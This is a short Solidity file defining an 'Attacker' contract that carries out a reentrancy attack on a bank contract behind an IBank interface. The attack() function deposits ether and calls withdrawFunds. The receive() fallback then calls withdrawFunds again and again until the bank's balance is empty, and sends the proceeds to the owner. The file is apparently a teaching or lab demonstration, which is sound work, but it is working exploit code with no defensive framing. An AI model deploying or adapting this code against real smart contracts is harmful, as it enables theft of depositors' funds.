// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {
    function deposit() external payable;

    function withdrawFunds() external;
}

contract Attacker is Ownable {
    IBank public immutable bank;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function attack() external payable onlyOwner{
        //deposit
        bank.deposit{value: msg.value}();
        bank.withdrawFunds();
        //withdraw
    }

    
    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdrawFunds();
        }
        else{
            payable(owner()).transfer(address(this).balance);
        }
    }
}
